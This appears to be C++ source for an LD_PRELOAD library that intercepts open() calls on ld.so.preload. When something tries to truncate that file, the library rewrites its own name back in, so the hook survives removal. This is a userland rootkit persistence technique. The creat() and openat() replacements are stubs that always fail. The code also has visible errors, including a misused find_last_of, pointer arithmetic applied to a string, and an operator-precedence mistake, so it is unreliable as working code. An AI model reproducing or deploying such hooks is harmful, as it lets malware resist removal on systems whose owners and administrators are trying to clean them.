
#include <main.h>


static DESCR_AND_FLAGS dsInfo;



int open(const char *pathname, int flags, mode_t mode) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	std::string file (pathname);
	size_t ind;
	char chArr[2]; // just in case for utf-16 coding with 2-bytes symbols
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	
	ind = file.find_last_of ('/', 0);
	++ind;
	if (ind != std::string::npos) file.assign (file, ind, file.length () - ind);
	
	// Is the ld.so.preload opening ?
	if (!strcmp (prelFileName, file.c_str ())) {
		descr_holder fd (new int (-1));
		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
		// fcntl (); // to lock mandatory the file
		while ((ind = rdPtr (*fd, chArr, 2)) == -1 && errno == EINTR);
		
		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
		if (-1 == ind) {
			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
			else return -1;
		}
		// the file doesn't exist
		if (chArr[0] == not_created) {
			if (!flags & O_CREAT) return -1;
			else {
				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
				return ret;
			}
		}
		// the file exists
		if (flags & O_TRUNC) {
			struct stat buf;
			int ret = opnPtr (pathname, O_RDWR | O_TRUNC);
			if (ret == -1) return ret;
			
			while (pwrite (ret,
						   hookLibraryName.c_str () + ' ',
						   hookLibraryName.size (), 0
				  ) == -1 && errno == EINTR
			);
			
			return opnPtr (pathname, flags & (~O_TRUNC), mode);
		}
		return opnPtr (pathname, flags, mode);
	}
	
	// this file isn't intersted for us
	return opnPtr (pathname, flags, mode);
}

int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
	
	
	
	
	return -1;
}

int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
	
	
	
	
	return -1;
}
